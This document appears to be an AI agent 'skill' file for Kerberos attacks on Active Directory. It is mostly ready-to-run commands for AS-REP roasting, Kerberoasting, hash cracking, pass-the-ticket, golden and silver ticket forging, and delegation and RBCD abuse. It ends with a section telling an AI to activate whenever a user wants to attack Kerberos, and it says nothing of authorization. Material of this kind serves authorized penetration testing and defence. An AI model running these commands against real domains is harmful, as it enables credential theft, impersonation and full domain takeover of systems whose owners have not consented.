# Kerberos Pentesting Skill

## Goal

Exploit Kerberos authentication in Active Directory environments to capture credentials, forge tickets, and achieve lateral movement or privilege escalation.

## Methodology

1. **Enumeration**: Identify domain controllers and SPNs
2. **AS-REP Roasting**: Attack users without pre-authentication
3. **Kerberoasting**: Extract service account password hashes
4. **Ticket Attacks**: Golden/Silver ticket, Pass-the-Ticket
5. **Delegation Attacks**: Abuse unconstrained/constrained delegation

## Tools

* **Impacket**: GetNPUsers, GetUserSPNs, ticketer
* **Rubeus**: Windows Kerberos abuse tool
* **Mimikatz**: Credential extraction and ticket forging
* **CrackMapExec**: Network pentesting tool
* **hashcat/john**: Hash cracking

## AS-REP Roasting

```bash
# Find users without Kerberos pre-auth (no creds needed)
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt

# With valid credentials
impacket-GetNPUsers domain.local/user:password -request

# CrackMapExec
crackmapexec ldap dc.domain.local -u user -p password --asreproast asrep.txt

# Crack AS-REP hashes (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt
john --format=krb5asrep asrep.txt
```

## Kerberoasting

```bash
# Request TGS for all SPNs (requires valid domain creds)
impacket-GetUserSPNs domain.local/user:password -request -outputfile tgs.txt

# Target specific SPN
impacket-GetUserSPNs domain.local/user:password -request -target-domain domain.local -spn MSSQLSvc/sql.domain.local

# CrackMapExec
crackmapexec ldap dc.domain.local -u user -p password --kerberoasting tgs.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:tgs.txt

# Crack TGS hashes (mode 13100 for RC4, 19700 for AES)
hashcat -m 13100 tgs.txt wordlist.txt
```

## Pass-the-Ticket

```bash
# Export tickets with Mimikatz
sekurlsa::tickets /export

# Pass ticket with impacket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.local/user@target -k -no-pass

# Inject ticket with Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi

# Convert between formats
impacket-ticketConverter ticket.kirbi ticket.ccache
```

## Golden Ticket

```bash
# Requires KRBTGT hash (from DC compromise)

# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt

# Impacket ticketer
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-xxx -nthash <krbtgt_hash> Administrator

# Use golden ticket
export KRB5CCNAME=/path/to/Administrator.ccache
impacket-psexec domain.local/Administrator@dc.domain.local -k -no-pass
```

## Silver Ticket

```bash
# Requires service account hash

# Mimikatz (CIFS service example)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:hash /ptt

# Impacket
impacket-ticketer -domain domain.local -domain-sid S-1-5-21-xxx -nthash <service_hash> -spn cifs/server.domain.local Administrator
```

## Delegation Attacks

### Unconstrained Delegation

```bash
# Find computers with unconstrained delegation
# LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=524288)
impacket-findDelegation domain.local/user:password

# Capture TGTs (need access to vulnerable host)
Rubeus.exe monitor /interval:5

# Coerce authentication (SpoolService, PetitPotam)
python3 printerbug.py domain/user:password@target attacker
```

### Constrained Delegation

```bash
# Find constrained delegation
impacket-findDelegation domain.local/user:password

# S4U2Self + S4U2Proxy attack
impacket-getST -dc-ip dc.domain.local -spn cifs/target.domain.local -impersonate Administrator domain.local/service_account:password

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# If you can modify msDS-AllowedToActOnBehalfOfOtherIdentity

# Add computer account
impacket-addcomputer domain.local/user:password -computer-name 'ATTACKPC$' -computer-pass 'Password123'

# Set RBCD
impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'ATTACKPC$' -action write domain.local/user:password

# Get ticket for impersonation
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain.local/'ATTACKPC$':'Password123'
```

## Nmap Scripts

```bash
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt target
```

## Metasploit Modules

```bash
# Kerberoasting
use auxiliary/gather/kerberoast

# Golden ticket
use auxiliary/admin/kerberos/forge_ticket
```

## Key Locations

```bash
# Kerberos tickets on Linux
/tmp/krb5cc_*
$KRB5CCNAME

# Kerberos tickets on Windows
# In-memory (extract with Mimikatz or Rubeus)
klist
```

## Guidance for AI

* Activate this skill when user wants to attack Kerberos, perform AS-REP roasting, Kerberoasting, or ticket attacks
* **AS-REP Roasting** doesn't need valid credentials - good first step
* **Kerberoasting** requires any domain credentials but can get service account hashes
* TGS (Kerberoast) hashes are easier to crack if RC4 encryption is used
* Golden tickets are persistent - survive password changes (except KRBTGT)
* For delegation attacks:
  - Unconstrained: Computer stores user TGTs, can be extracted
  - Constrained: Can impersonate users to specific services
  - RBCD: Newer attack, requires ability to modify AD objects
* Always try both impacket (Linux) and Rubeus (Windows) - each has advantages
* Use `-k -no-pass` with impacket tools when using ticket authentication
* Kerberos uses port 88 (TCP/UDP)
